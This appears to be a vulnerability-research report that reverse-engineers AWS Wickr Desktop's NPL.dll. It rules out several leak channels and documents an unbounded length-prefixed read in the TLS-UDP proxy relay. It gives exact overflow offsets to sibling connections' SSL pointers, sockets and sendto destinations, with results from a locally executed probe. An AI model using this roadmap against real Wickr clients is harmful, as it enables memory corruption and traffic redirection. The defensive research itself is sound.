# W14 — SCOPE 1: the information-disclosure sweep, run at last

Target: **AWS Wickr Desktop 6.72.20.0 (Windows x64)**. Binaries `NPL.dll`, `WickrPro.exe`.
All disassembly is `.pdata`-bounded per function (`scratch/w13/fn.py`), with the caveat in §8.
New tools this wave: `scratch/w14/{vtslot,hier,vtdump,argsrc,iatarg,lin}.py`.

---

# 0. THE FALSIFYING OBSERVATION, WRITTEN BEFORE LOOKING (§0 rule 4)

**Channel checked first: the `Musigy::AV::Parser` kind==3 EVENT emitter `NPL 0x18011f970`, whose
sub-message W13 recorded as "sourced from `Parser+0x88`".**

> **TRUE** if the object rooted at `Parser+0x88` has a field whose stored value is a byte-copy or
> arithmetic image of received data — traceable through registers to the re-parsed peer `PacketHeader`
> at `Parser complete+0x158`, to the transport buffer `onPacket` receives in `r8`, or to a heap load
> whose address is computed from a peer-declared length — **and** that field is reached by the
> serializer.
> **FALSE** if every store into it is a compile-time immediate, a clock/config read, or a locally
> incremented counter.
> **The deciding instruction** is the set of stores into `Parser+0x88`, read with their source
> operands. Not the presence of the emit call.

**The written prediction was wrong in its premise and the correction is the first result: `Parser+0x88`
is not a source at all.** See §1.

---

# 1. ★ CORRECTION TO W13: `Parser+0x88` is the SERIALISATION DESTINATION, not a source

W13: *"attaches a sub-message sourced from `Parser+0x88`"*. **REFUTED (disassembled).**
`0x180109560`, the callee at `0x18011fa35`, is 35 bytes and is `MessageLite::SerializeToString`:

```
0x180109560  4883ec38        sub  rsp, 0x38
0x180109564  33c0            xor  eax, eax
0x180109566  48894210        mov  qword ptr [rdx + 0x10], rax   ; out->_Mysize = 0
0x18010956a  488bc2          mov  rax, rdx
0x18010956d  48837a180f      cmp  qword ptr [rdx + 0x18], 0xf   ; out->_Myres vs SSO cap
0x180109572  7603            jbe  0x180109577
0x180109574  488b02          mov  rax, qword ptr [rdx]          ; heap buffer
0x180109577  c60000          mov  byte ptr [rax], 0             ; out[0] = '\0'
0x18010957e  e9adf5ffff      jmp  0x180108b30                   ; AppendToString
```

`rdx` is an MSVC `std::string` (`_Bx` +0, `_Mysize` +0x10, `_Myres` +0x18). So the call is
`SerializeToString(msg = [rsi+0x80], out = rsi+0x88)`. **`Parser+0x88` is the output buffer**, freshly
cleared on every emit. Confirmed independently: the caller later passes its size as argument 5 —
`mov eax,[rsi+0x98]` @ `0x18011fc60`, and `0x98 = 0x88 + 0x10` = `_Mysize`.

**⇒ the question moves from "what fills `+0x88`" to "what is in the message at `[rsi+0x80]`, and what is
the packet's payload".** Both are answered below.

---

# 2. ★ THE RECEIVE→SEND EDGE IS REAL, AND IT RUNS. RTTI-CONFIRMED AND MEASURED LIVE

`0x18011f970` resolves to **`Musigy::AV::Parser` vtable `0x18043ef18`, slot 3 (+0x18), this-offset
216**. The class hierarchy descriptor (`hier.py`, 16 base-class descriptors) says why that matters:

```
[6]  mdisp 112  .?AVPacketReceiver@AV@Musigy@@
[11] mdisp 216  .?AVPacketSender@AV@Musigy@@
```

**`Musigy::AV::Parser` — the receive-side deserialiser — inherits `PacketSender`.** This is not
inferred from behaviour; it is in the RTTI. `Parser complete+0x70` is its `PacketReceiver`
(`onPacket 0x18011fce0` at slot 1) and `complete+0xd8` is its `PacketSender`.

And it is **not dead code.** From the operator's own captured NPL logs (33 files, 168,890 lines):

```
[I ... AV.Parser.VSrhr] Sending feedback packet, event id is 140      x9, three separate sessions
[I ... AV.Serializer.*] Sending EVENT packet,    event id is 140      x9
```

`0x18011f970`'s own log literals, read out of the image at `0x18043f2a0` / `0x18043f210` (UTF-16), are
`"Sending feedback packet, event id is "` and `"Failed to serialize feedback packet header. Discarding
the packet"` — so the `AV.Parser` lines above are exactly this function. **A receive-side component
originates packets on this build, measured.**

*(Correction to a reading I nearly published: the 100 `Sending EVENT packet` lines are all tagged
`AV.Serializer` and come from a different function. Grepping for "EVENT" alone finds nothing in the
Parser and would have produced a false negative — the string is "feedback".)*

## 2.1 What the emitted header contains — NEGATIVE, closed by one function

`[rsi+0x80]` with `rsi = complete+0xd8` is **`Parser complete+0x158`** — the *same* `PacketHeader`
message object that `onPacket` re-parses in place from every received packet
(`mov rdx,[rdi+0xe8]` @ `0x18011fdca`, `rdi` = complete+0x70). So the emitter reuses the received
message to build an outgoing header, and the whole channel turns on whether `Clear()` is complete.

`0x18013b350` = `PacketHeader` vtable `0x180442428` slot 3 = **`PacketHeader::Clear()`**. Read in full
(see §8 — `fn.py` reports it as 8 bytes; it is 281):

```
0x18013b3b8  8b5f10          mov  ebx, [rdi+0x10]            ; has-bits word
0x18013b3bb  f6c303          test bl, 3                      ; fields 9 and 12 (sub-messages)
             ... clears [rdi+0x30] and [rdi+0x38] sub-objects ...
0x18013b419  f6c3fc          test bl, 0xfc                   ; has-bits 2..7 = fields 3,4,5,6,7,8
0x18013b41c  740d            je   0x18013b42b
0x18013b41e  0f57c0          xorps xmm0, xmm0
0x18013b423  0f114740        movups xmmword ptr [rdi+0x40], xmm0   ; fields 3,4,5,6  := 0
0x18013b427  48894750        mov  qword ptr [rdi+0x50], rax        ; fields 7,8      := 0
0x18013b42b  f7c3000f0000    test ebx, 0xf00                 ; has-bits 8..11 = f10,f11,f13,kind
0x18013b436  7410            je   0x18013b448
0x18013b43a  48894758        mov  qword ptr [rdi+0x58], rax        ; fields 10,11    := 0
0x18013b43e  894760          mov  dword ptr [rdi+0x60], eax        ; field 13        := 0
0x18013b441  c7476401000000  mov  dword ptr [rdi+0x64], 1          ; kind := default
0x18013b44e  894710          mov  dword ptr [rdi+0x10], eax        ; has-bits := 0
```

**Every one of the ten int32s, both sub-messages and the has-bits word are cleared.** The emitter then
sets exactly `kind=3` (`+0x64`), field 4 = `0x80` (`+0x44`), field 5 = 0, field 6 = 0, and field 7 =
the event id (`0x18011fa20 44896050 mov [rax+0x50], r12d`), each with its has-bit ORed in. The
generated serialiser emits only fields whose has-bit is set.

> **VERDICT: NEGATIVE. No byte of a received `PacketHeader` survives into the emitted feedback packet.**
> The residue hypothesis — the obvious way this channel could have leaked — is closed by
> `PacketHeader::Clear 0x18013b350` being complete.

## 2.2 What the emitted payload contains — the census, and it is NEGATIVE

The emitter builds the outgoing packet with

```
0x18011fc27  mov  rdi, [r14+0x10]        ; payload ptr   (r14 = argument 3)
0x18011fc2b  mov  r12d,[r14+0x18]        ; payload len
0x18011fc6a  mov  r9,  r15               ; serialised header
0x18011fc76  call 0x180135ea0            ; Frame::create(pool, payload, len, hdr, hdrlen)
0x18011fc93  call 0x180119ba0            ; push it out
```

so **the payload is argument 3** — a `Frame*` handed in by whoever raised the event. The AV graph turns
out to carry an **upstream feedback bus**: `PacketSender::onEvent` (`0x180132cc0`, the base
implementation shared by **24 node classes**) is a pure forwarder —

```
0x180132ce0  mov r8, r8 -> rbx           ; keep the incoming payload
0x180132cf5  mov r8, rbx                 ; forward it unchanged
0x180132cfd  call 0x180119ba0
```

— and `Parser::onEvent 0x18011f970` is the **terminal** that turns whatever reaches it into a wire
packet. So the leak question is exactly: *does any node inject a payload containing received bytes?*

Census of **all 24 emit sites** (`argsrc.py npl r8 180119ba0 180119d90`, then hand-read):

| payload at the emit site | count | classification |
|---|---|---|
| `xor r8d, r8d` | **18** | **originator, NULL payload** |
| `mov r8, rsi` / `rbx` (the incoming payload) | 4 | forwarder (`PacketSender::onEvent` base, `Muter::onEvent` ×2, `SplitterOutputNode`) |
| `mov r8, rax` @ `0x18011fc8c` | 1 | the `Parser` terminal itself |
| `mov r8, rax` @ `0x180133ad1` | 1 | **`NetworkSink::ChannelListener` slot 5 — the only originator with a payload** |

Event ids at the same 24 sites are compile-time constants `0x80`/`0x81`/`0x82`/`0x8c` or small computed
offsets (`add edx,0x96`, `add edx,0xa0`); only the forwarders and the terminal carry a variable id.

The one originator with a payload, `0x180133a20` (`Musigy::AV::NetworkSink::ChannelListener` vtable
slot 5), builds `Frame::create(pool, [rsi], [rsi+8], [rax], [rax+8])` with an id from
`movzx r13d, word [rsi+0xc]`. **`NetworkSink` is not instantiated in this product's call scenes** —
see §3.

> **VERDICT: NEGATIVE. Every AV-graph originator of a feedback event passes a NULL payload
> (`xor r8d, r8d`, 18/18). The only payload-bearing originator is a class that does not appear in any
> observed scene. The single attacker-visible quantity on this channel is the event id, a small enum.**
>
> **Qualifier that travels with it:** "18/18 pass NULL" is a static census of direct call sites to
> `0x180119ba0` / `0x180119d90`. It does not exclude a caller reaching the bus through a function
> pointer or a path outside `.pdata` (§8).

---

# 3. ★ DELIVERABLE 2 — the `0x180135d20` census (`Frame::copyMetadata`)

**What it copies — CONFIRMED (disassembled), 94-byte function:**

```
0x180135d2b  mov eax,[rdx+0x8c] / 0x180135d38 mov [rcx+0x8c],eax     ; field 3
0x180135d45  mov eax,[rdx+0x90] / 0x180135d4b mov [rcx+0x90],eax     ; field 4  (incl. bit-14 ctx sel)
0x180135d51  mov eax,[rdx+0x98] / 0x180135d57 mov [rcx+0x98],eax     ; field 10 (the F2c ratchet epoch)
0x180135d5d  mov eax,[rdx+0x9c] / 0x180135d63 mov [rcx+0x9c],eax     ; field 11
0x180135d69  mov eax,[rdx+0xa0] / 0x180135d6f mov [rcx+0xa0],eax     ; field 13
0x180135d31  lea r14,[rdx+0xa8] / 0x180135d3e lea rdi,[rcx+0xa8]     ; + a container at +0xa8
```

**It copies exactly the peer-metadata block.** That is what makes this census the right question.

**Why an edge would matter — CONFIRMED (disassembled).** `Serializer::onPacket 0x18011d240` takes its
input Frame in `r8` (`mov r14, r8` @ `0x18011d270`) and writes the *outgoing* `PacketHeader` straight
out of it:

```
0x18011d592  mov ecx,[r14+0x18]  -> Buffer.size            (this is F2's field)
0x18011d5b2  mov ecx,[r14+0x8c]  -> outgoing header +0x40  (field 3)
0x18011d5d3  or  ecx,[r14+0x90]  -> outgoing header +0x44  (field 4)
0x18011dbc4  mov rdx, r14        -> copyMetadata(newFrame, inputFrame)
```

⇒ **if a Frame carrying received metadata ever reached any `Serializer`, peer fields 3/4/10/11/13 would
be echoed onto the wire verbatim.**

**The census — all 15 call sites, classified:**

| # | caller | class / role | dst (`rcx`) | src (`rdx`) | scene |
|---|---|---|---|---|---|
| 1 | `0x18011b3b0` | `CryptProxy::onPacket` | new Frame (`mov rcx,rax`) | input (`r14`) | both, separate instances |
| 2 | **`0x18011d240`** | **`Serializer::onPacket`** | new (`rax` ← `0x180136080`) | input (`r14`) | **SEND terminal** |
| 3 | `0x180125680` | `ColorspaceConverter::onPacket` | new (`rax`) | input (`r13`) | both |
| 4 | `0x1801279c0` | (helper, chained chunk) | `r14` | `rbp` | — |
| 5 | `0x1801362e0` | `Packet`/`Frame` clone helper | `rdi` | `rbx` | — |
| 6 | `0x180140f90` | `VpxEncoder::onPacket` | new (`rax`) | `[rbp-0x60]` | SEND |
| 7 | `0x180144520` | `VpxDecoder::process` | `r13` | `rbx` | RECEIVE |
| 8 | `0x180147c30` | audio decode helper | `rsi` | `r13` | RECEIVE |
| 9 | `0x180148dd0` | `OpusDecoder::decodeSubPacket` | `rsi` | `r15` | RECEIVE |
| 10-11 | `0x18014a7e0` ×2 | `FdkAacEncoder::onPacket` | `r14` / `rsi` | `rsi` / `r13` | SEND |
| 12 | `0x18014b9a0` | `OpusEncoder::onPacket` | `rsi` | `r13` | SEND |
| 13 | `0x1803d6720` | `VideoResizer::onPacket` | new (`rax`) | `rbp` | SEND |
| 14 | `0x1803d78e0` | `Crop` | new (`rax`) | `rsi` | SEND |
| 15 | `0x1803d88b0` | `AspectRatioCrop` | new (`rax`) | `rsi` | SEND |

**The shape is uniform across all 15: `dst` is a Frame created moments earlier in the same function,
`src` is the register holding the node's own input Frame.** No site copies across two independently
sourced Frames. So metadata propagates *along* a scene and never between scenes, and the census
reduces to a graph question.

**The graph question, MEASURED.** Every distinct scene-graph string the client has ever printed
(33 logs, 168,890 lines) — the app prints these at every call start, source→sink:

```
NetworkSource->Parser->CryptProxy->PacketMonitor->OpusDecoder->AudioOutputStream
NetworkSource->Muter->Parser->CryptProxy->PacketMonitor->VpxDecoder->ColorspaceConverter->ProxyVideoOutput
AudioSource->Muter->NoiseGate->OpusEncoder->PacketMonitor->CryptProxy->Serializer
NPLSource->Muter->NoiseGate->OpusEncoder->PacketMonitor->CryptProxy->Serializer
NPLSource->Muter->PacketMonitor->ColorspaceConverter->VpxEncoder->CryptProxy->Serializer
DShowCamCapture->Crop->ColorspaceConverter->PacketMonitor->Muter->PacketMonitor->ColorspaceConverter->CryptProxy->Serializer
DShowCamCapture->Crop->ColorspaceConverter->PacketMonitor->Muter->PacketMonitor->ColorspaceConverter->VpxEncoder->CryptProxy->Serializer
```

**Seven shapes, and the node sets are disjoint.** `Parser` occurs only in scenes headed by
`NetworkSource`; `Serializer` only at the tail of scenes headed by `AudioSource`, `DShowCamCapture` or
`NPLSource` — all three local capture sources. `NetworkSink`, `Splitter`, `Puller`, `JitterBuffer` and
`PacketQueue` occur in **none**.

> **VERDICT: NEGATIVE. No `copyMetadata` call site can carry a received Frame's metadata onto the send
> path, because no node instance is in both a receive and a send scene.** This is the negative the
> brief asked for: it settles the "can the peer's own fields be echoed" question for F1, F4f and
> Route A at once.
>
> **Qualifier that travels with it:** the disjointness is **measured** over the operator's two-party
> audio+video calls, not proved from the graph builder (`0x1800ef820`). Group calls, screen share and
> the `ScreenCapture`/`DesktopCapture`/`Splitter` node types were never exercised. To harden it,
> read the builder and show it cannot wire a `PacketReceiver*` of a send-scene node into
> `[receiveNode+0xd0]`.

---

# 4. `0x180144410` — identified, and it does NOT reach the wire

**CONFIRMED (disassembled).** `0x180144410` is **`VpxDecoder` primary vtable `0x180443a30`, slot 15
(+0x78)** — the last slot of that vtable. It is a getter with an out-parameter:

```
0x180144410  4885d2        test rdx, rdx          ; rdx = OUT struct; NULL -> return
0x180144427  lea  rbx,[rcx+0x470]  / lock
0x18014443a  movups xmm0,[rsi+0x498] -> [rdi+0x00]
0x180144444  movups xmm1,[rsi+0x4a8] -> [rdi+0x10]
0x18014444f  movups xmm0,[rsi+0x4b8] -> [rdi+0x20]
0x18014445a  movsd  xmm1,[rsi+0x4c8] -> [rdi+0x30]      ; the poisonable counter
0x180144467  mov    eax, [rsi+0x4d0] -> [rdi+0x38]
```

0x3c bytes, `+0x498…+0x4d3`, which includes both counters a peer can set to an arbitrary 32-bit value
(`add dword [rdi+0x4c8], eax` @ `0x180144197`, `add dword [rdi+0x4bc], eax` @ `0x180144239`).

**Its consumer is not the event bus.** `VpxDecoder`'s own `PacketReceiver::onEvent` is
`0x180144490` (this-off-112 vtable `0x180443ab8` slot 3), and it dispatches only four ids:

```
0x1801444a4  lea eax,[r8-0x22] / cmp eax,1 / jbe   ; id 34 or 35 -> 0x1801227f0(complete, id==34)
0x1801444b9  lea eax,[r8-0x24] / cmp eax,1 / jbe   ; id 36 or 37 -> 0x180122830
0x1801444d7  call 0x180119cd0                      ; anything else -> forward
```

**It never calls slot 15.** (Ids 34 and 35 are exactly the ids the logs show arriving off the wire:
`Received EVENT packet, id: 34` ×19, `id: 35` ×48.)

The two `call [rax+0x78]` sites that *are* gated on an event id (`cmp r8d,0x8c` @ `0x180121739`,
`cmp ebx,0x8c` @ `0x1801217a1`) belong to **`VideoEncoder`/`VpxEncoder`** (`0x180121710` /
`0x180121770`), whose primary-vtable slot 15 is `0x18013fbf0` — a different function. Slot-number
collision, different hierarchy.

> **VERDICT: the peer-poisonable decoder loss statistics do NOT reach the network through the AV event
> bus.** `0x180144410` has no direct caller in `NPL.dll` and no dispatcher reaches it.
> **UNDETERMINED:** whether a host-side (WickrPro) consumer exists. W13 established the 16 NPL
> statistics exports are host-facing, which bounds but does not close this.

---

# 5. ★ DELIVERABLE — SCOPE 2(a) IS ANSWERED. `PacketHeader` FIELD 7 IS CLOSED, 9/9

W13 left one field open: the kind==3 EVENT id reaching an indirect call as argument 3 at
`0x18011ecc3 ff5018 call qword ptr [rax+0x18]`, on a delegate at `Parser+0x118` whose class was not
identified.

**`[Parser complete+0x118]` is `PacketSender+0x40`** — the sender base's own listener slot, zeroed by
the `PacketSender` constructor `0x180131fc0` (`0x18013203d 48897b40 mov qword ptr [rbx+0x40], rdi`,
rdi = 0). That is why W13's sweep of `0x180118000`–`0x180140000` found no store: it is a member of a
*base class* wired by the graph builder, not by `Parser`'s own code.

**Its type is fixed by the call's own argument shape**, which I read rather than guessed:

```
0x18011eca7  mov  rcx, [rsi + 0x118]      ; the listener        (rsi = Parser complete; vbptr at +8
0x18011ecb3  mov  rax, [rcx]              ; its primary vtable   matches RTTI pdisp 8)
0x18011ecb6  mov  r9,  rdi                ; arg4 = the new Frame
0x18011ecb9  mov  r8d, r14d               ; arg3 = THE PEER EVENT ID (field 7, unclamped)
0x18011ecbc  lea  rdx, [rsi + 0xd8]       ; arg2 = the Parser's own PacketSender (a reply handle)
0x18011ecc3  call qword ptr [rax + 0x18]  ; slot 3
```

`(this, PacketSender* replyTo, int eventId, Frame* payload)` with `this` at this-offset 112 — i.e.
**`PacketReceiver::onEvent`**. Every implementation of that slot, found by scanning the this-off-112
vtables:

| implementation | class | what it does with the peer id |
|---|---|---|
| `0x180119cd0` | the generic base (Parser, Serializer, CryptProxy, …) | looks up the next node and forwards |
| `0x180121710` | `VideoEncoder` / `VpxEncoder` | `cmp r8d,0x80` → slot 14; `cmp r8d,0x8c` → slot 15; else `jmp 0x180119cd0` |
| `0x180144490` | `VpxDecoder` | ids 34/35 → `0x1801227f0`; 36/37 → `0x180122830`; else forward |
| `0x18012e790` | `SplitterOutputNode` | forwards (`mov edx, edi`) |

> **VERDICT: NEGATIVE. Field 7 is compared against small sets of compile-time constants and otherwise
> forwarded. It is never an index, a map key, an allocation size or a length.** This is the benign one
> of the two outcomes W13 predicted.
>
> **⇒ The `Proto::PacketHeader` consumer map is now COMPLETE: 9 of 9 unclamped fields taken to a
> verdict.** (Field 10 = F2c is the only defect; 3, 4, 5, 6, 7, 8, 11, 13 are negatives.)
>
> Note in passing: `0x180121710`'s id-140 arm is how a peer's "send me a keyframe" reaches the local
> **encoder** — which is the concrete cross-scene control link, and it carries an enum, not data.

---

# 6. ★ THE ONE POSITIVE: a length-confusion in the TLS-UDP proxy relay (`NPL 0x18009d570`)

Found by abandoning the AV graph and enumerating the **actual egress points** instead: `NPL.dll`'s
only network-write imports are `sendto`, `send`, `SSL_write`, `BIO_write`; `sendto`/`send` have
**8 call sites total** (`SSL_write`/`BIO_write` have zero rip-relative references — see §8).

Seven are keepalives and small control writes. The eighth, `0x18009ddf0`, sends from a buffer
**embedded in the connection object** with a length taken from a 16-bit object field:

```
0x18009ddce  movzx r8d, word ptr [rdi+0x12f8]      ; length
0x18009ddd6  lea   rdx, [rdi+0xaf8]                ; buffer  (inline: lea, not a load)
0x18009dddd  movsxd rcx, dword ptr [rdi+0x2ec]     ; a DIFFERENT socket from the one it recv'd on
0x18009ddf0  call  qword ptr [rip+0x386cca]        ; sendto
```

The containing function is the **TCP/TLS→UDP relay** — its own log literals are
`'TCP socket is gracefully closed'`, `'TCP_TLS socket is closed, error: '`,
`"RecvDataSize doesn't match FullDataSize. RecvDataSize: "`, `'Cannot write to UDP socket, error: '`.
The log tag is `Net.TcpProxyConnection`, and it is **live**:

```
[I ... Net.TcpProxyConnection] SSL connection to <hidden> established
[I ... Net.TcpProxyConnection] TLS-UDP connection to <hidden> is established
 77 x  (TLS-UDP proxy) Starting to establish connection to tls://<hidden>
  7 x  TLS-UDP proxy connection to tls://<hidden> established
```

## 6.1 The framing, and the missing bound — CONFIRMED (disassembled)

The wire format is `[u16 length][length bytes]`. Phase 1 reads the 2-byte prefix
(`mov r14d, 2` @ `0x18009d5b2`; `recv` @ `0x18009d5ec`). Then:

```
0x18009d950  cmp   r15w, r14w                      ; >= 2 bytes of prefix received?
0x18009d954  jb    0x18009debc                     ; no -> wait
0x18009d95a  movzx r15d, word ptr [rdi+0xaf8]      ; FullDataSize := THE PEER'S u16, from buffer[0..1]
0x18009d962  mov   word ptr [rdi+0x12f8], r15w     ; stored -- NO COMPARISON OF ANY KIND
0x18009d96a  mov   word ptr [rdi+0x12fa], r12w     ; accumulated := 0
```

and both read paths then use it as a length directly:

```
plain TCP (byte [rdi+0x80] == 0):
0x18009d997  movzx r8d, r15w
0x18009d99b  sub   r8d, r12d                       ; want = FullDataSize - accumulated
0x18009d99e  lea   rdx, [rdi+0xaf8]
0x18009d9a5  add   rdx, r12                        ; dst  = buffer + accumulated
0x18009d9ae  call  qword ptr [rip+0x387124]        ; recv

TLS (byte [rdi+0x80] != 0):
0x18009db04  movzx eax,  word ptr [rdi+0x12fa]
0x18009db0b  movzx r8d,  word ptr [rdi+0x12f8]
0x18009db13  sub   r8d,  eax                       ; want = FullDataSize - accumulated
0x18009db16  lea   rdx, [rax+0xaf8]
0x18009db1d  add   rdx, rdi                        ; dst  = buffer + accumulated
0x18009db27  call  0x18010e70f                     ; SSL_read wrapper
```

**The buffer's capacity is 0x800 = 2048 bytes, bounded from both sides rather than assumed:** the reset
routine `0x18009b2e0` writes a field immediately *below* it (`0x18009b42f mov dword [rdi+0xaf4], esi`)
and the fill counter immediately *above* it (`0x18009b435 mov dword [rdi+0x12f8], esi`), and a sweep of
every function in this class found **no field accessed anywhere in (0xaf8, 0x12f8)**. Fields resume at
`+0x12f8`, `+0x12fa`, `+0x1300`, `+0x1308`, `+0x130c`, `+0x1314`.

> **CONFIRMED (disassembled, not executed): a peer-supplied 16-bit length prefix drives a read of up to
> 65,535 bytes into a 2,048-byte inline buffer, on both the plain-TCP and the TLS variants. There is no
> comparison of `FullDataSize` against any capacity anywhere in the 2,422-byte function.**
>
> This is an out-of-bounds **write** of up to ~63.5 KB past the buffer, with **fully attacker-chosen
> content and attacker-chosen length, and no precondition** — no allocation failure (unlike F1), not
> zeros (unlike F2), not zero-extended 32-bit (unlike F4f). It is a better write primitive than any of
> the six the engagement already holds.

## 6.2 Why this is also the leak shape — and the one thing I could not establish

The overflow's **first two casualties are the length counters themselves**: `+0x12f8` sits at
`buffer+0x800` and `+0x12fa` at `buffer+0x802`. After the read, both are re-read and then drive the
send:

```
0x18009dcf2  add   r14w, word ptr [rdi+0x12fa]     ; accumulated += bytes read   (16-bit, wraps)
0x18009dcfa  mov   word ptr [rdi+0x12fa], r14w
0x18009dd02  movzx r15d, word ptr [rdi+0x12f8]     ; FullDataSize  <- re-read, possibly clobbered
0x18009dd0e  cmp   r14w, r15w / jb  -> return
0x18009dd18  cmp   r14w, r15w / je  -> skip the warning
0x18009ddce  movzx r8d,  word ptr [rdi+0x12f8]     ; sendto length <- the same clobbered value
```

So a frame declaring `0x804` bytes writes 0x800 bytes of buffer plus 4 attacker-chosen bytes onto
`[+0x12f8]` and `[+0x12fa]`. Choosing `[+0x12f8] = L` and `[+0x12fa] = L - 0x804 (mod 2^16)` makes
`r14w == r15w == L`, taking the `je` and reaching `sendto` with **length `L` from a 2,048-byte
buffer — an over-read of up to ~63.5 KB, transmitted.**

*(Without the overflow there is no over-read here: the `jb` at `0x18009dd12` guarantees
`accumulated >= FullDataSize`, so the send length is always covered by bytes actually received. The
over-read exists only as a consequence of the overflow clobbering the counters.)*

## 6.2a RESOLVED — the `sendto` destination is the client's own media socket, so the over-read is local

**CONFIRMED (disassembled).** The writer of `[obj+0x1d0]` is in the *other* direction of the relay,
`0x18009def0`, and its source is **not** the datagram's sender — it is a configured address held in the
same object:

```
0x18009e5e4  lea rdx, [rsi + 0x1a0]      ; src = obj+0x1a0, family at obj+0xc8 (2 = AF_INET,
0x18009e5eb  lea rcx, [rbp - 0x30]       ;                  0x17 = AF_INET6, checked @0x18009e832)
0x18009e5ef  call 0x180112e1e            ; build a sockaddr in a stack local
0x18009e5f7  movups xmmword ptr [rbx], xmm0 ...   ; zero obj+0x1d0 .. +0x250
0x18009e619  mov dword ptr [rbx + 0x80], ecx     ; obj+0x250 := its length
0x18009e6a8  mov rcx, rbx                 ; dst = obj+0x1d0
0x18009e6a4  lea rdx, [rbp - 0x30]
0x18009e6ab  call 0x180112e1e             ; copy it in
```

Direction of the relay, established from the two functions' syscalls:

| function | reads | writes | direction |
|---|---|---|---|
| `0x18009def0` | `recvfrom` on `[obj+0x2ec]` (UDP) into `obj+0x2f4` | `send` on `[obj+0x2e4]` (TCP) | media stack → hub |
| `0x18009d570` | `recv`/`SSL_read` on `[obj+0x2e4]` (TCP) into `obj+0xaf8` | `sendto` on `[obj+0x2ec]` to `obj+0x1d0` | hub → media stack |

⇒ **`obj+0x1d0` is the endpoint the unwrapped tunnel datagrams are delivered to — the client's own
media socket** (the one the log shows as `Hub::Port::BindToUDP … 0.0.0.0:0`).

> **⇒ THE DIRECT LEAK READING OF §6.2 IS CLOSED, IN THE HONEST DIRECTION. The ~63.5 KB over-read is
> delivered to the victim's own media socket, not to the attacker.** Scope 1's answer for this channel
> is *no*, like the other four. **The out-of-bounds write of §6.1 is unaffected and stands.**
>
> **Qualifier:** `obj+0x1a0`'s own provenance was not traced further back. It is a configured sockaddr,
> and the relay direction fixes its role, but I did not find the code that populates it.

## 6.2b ★ WHAT REPLACES IT — the overflow lands on an array of 7 sibling connection objects

Found while resolving the above, and it is worth more than the question it answers. The relay handler
has **eight call sites, all in one function**, each on a different sub-object of one parent:

```
0x18009c010  lea rcx, [rbx + 0x60]     0x18009c109  lea rcx, [rbx + 0x4ce0]
0x18009c04c  lea rcx, [rbx + 0x1380]   0x18009c148  lea rcx, [rbx + 0x6000]
0x18009c08b  lea rcx, [rbx + 0x26a0]   0x18009c187  lea rcx, [rbx + 0x7320]
0x18009c0ca  lea rcx, [rbx + 0x39c0]   0x18009c1c7  lea rcx, [rbx + 0x8640]
```

Constant stride **0x1320**. ⇒ **the connection object is exactly 0x1320 bytes and eight of them are
contiguous.** (This also confirms the §6.1 capacity independently: the highest field seen was `+0x1314`,
and `0x1320` is the next 16-byte boundary.)

**And the capacity claim gets a second, stronger confirmation — §0 rule 5, textbook.** The object holds
**two** 0x800-byte buffers, and the *other* one is correctly bounded by a compile-time constant:

```
0x18009e334  41b800080000    mov  r8d, 0x800          ; <== the capacity, as a literal
0x18009e33a  452bc6          sub  r8d, r14d           ;     minus accumulated
0x18009e340  4881c2f4020000  add  rdx, 0x2f4          ;     into obj+0x2f4
0x18009e363  call            WS2_32!recvfrom
```

`obj+0x2f4 + 0x800 = obj+0xaf4` — exactly the field the reset routine writes immediately below the
second buffer. **So the UDP read path caps at 0x800 with a literal, and the TCP/TLS read path in the
sibling routine takes its length off the wire with no cap at all.** The correct bound is already
written in this class, 0x1000 bytes away.

**What the overflow reaches, at fixed known offsets.** Write offset of sibling[i+1]'s base is
`0x1320 − 0xaf8 = 0x828`:

| sibling field | what it is | offset into the write |
|---|---|---|
| `+0x58` | a `CRITICAL_SECTION` | **0x880** (2176) |
| `+0x88` | the `SSL*` | **0x8b0** (2224) |
| `+0x1d0` | the `sendto` destination `sockaddr_storage` | **0x9f8** (2552) |
| `+0x250` | its length | **0xa78** (2680) |
| `+0x2e4` / `+0x2ec` | the TCP and UDP socket handles | **0xb0c** / **0xb14** |
| `+0x12f8` / `+0x12fa` | that connection's own length counters | **0x1b20** / **0x1b22** |

**A single frame declaring ~0xb20 bytes overwrites the next connection's SSL pointer, both socket
handles, and its `sendto` destination and length.** So the leak question returns by a different route:
the attacker cannot read through *this* connection's `sendto`, but can **set a sibling connection's
`sendto` destination to an arbitrary address**, after which that connection relays its traffic there.

**This is also the adjacency link (a) spent three waves failing to find** — a fixed, known-offset,
pointer-bearing target reachable at a chosen displacement, rather than a lone heap block with a
measured 0.07 % pointer density.

**NOT established, and it matters:** whether more than one of the eight connections is simultaneously
active. If only one is, the sibling corruption is real but produces no traffic. Nothing here was
executed.

## 6.2c ★ EXECUTED — the overflow runs against the shipped `NPL.dll`, and the reach is measured

`scratch/w14/relayprobe.c` builds the minimum connection object the function needs (two
`CRITICAL_SECTION`s at `+0x30`/`+0x58` — the displacements the shipped code uses, which are exactly 40
bytes apart, i.e. `sizeof(CRITICAL_SECTION)`; the plain-TCP flag at `+0x80`; the sockets at `+0x2e4`
and `+0x2ec`; both counters zeroed), backs it with a **loopback TCP pair**, preloads one crafted frame,
and calls `NPL.dll + 0x9d570` by address. Nothing contacts Wickr infrastructure and `WickrPro.exe` is
never started. Payload bytes are a position counter (`0x41 + (i & 0xf)`) so every landed byte is
attributable to its source offset.

```
declared 0x7ff   -> fill 0x07ff  accumulated 0x07ff   sibling slot: UNTOUCHED      <-- CONTROL
declared 0x800   -> fill 0x0800  accumulated 0x0800   sibling slot: UNTOUCHED      <-- CONTROL
declared 0x1000  -> fill 0x4241  accumulated 0x5443   sibling MODIFIED +0x0..+0x7d7  (2,008 B)
declared 0xffff  -> fill 0x4241  accumulated 0x4442   past-object reach:
                                    obj+0x1320 .. obj+0x10af6  = 63,447 bytes
```

**The controls are the load-bearing half** (§0 rule 11). At exactly the capacity and one below it the
sibling slot is untouched *and* the counters hold the legitimate values — so the probe finds the
boundary precisely where the disassembly said it is, rather than merely finding damage.

**Every predicted offset landed, with attacker-chosen bytes:**

```
sibling +0x058 CRITICAL_SECTION : 41 42 43 44
sibling +0x088 SSL*             : 4847464544434241
sibling +0x1d0 sendto dest      : 504f4e4d4c4b4a49
sibling +0x250 dest length      : 4c4b4a49
sibling +0x2e4 TCP socket       : 504f4e4d
sibling +0x2ec UDP socket       : 48474645
```

and the connection's own length counters at `+0x12f8`/`+0x12fa` are overwritten with payload
(`0x4241` = the bytes at write offsets 0x800/0x801), which is the mechanism §6.2 describes.

**At the full u16 the write is 63,447 bytes past the object** — more than the seven sibling
connections (7 × 0x1320 = 34,320 B) plus ~29 KB beyond the whole eight-slot array. **`loadFromData`-
style silence: the function returned normally in every run; nothing crashed.**

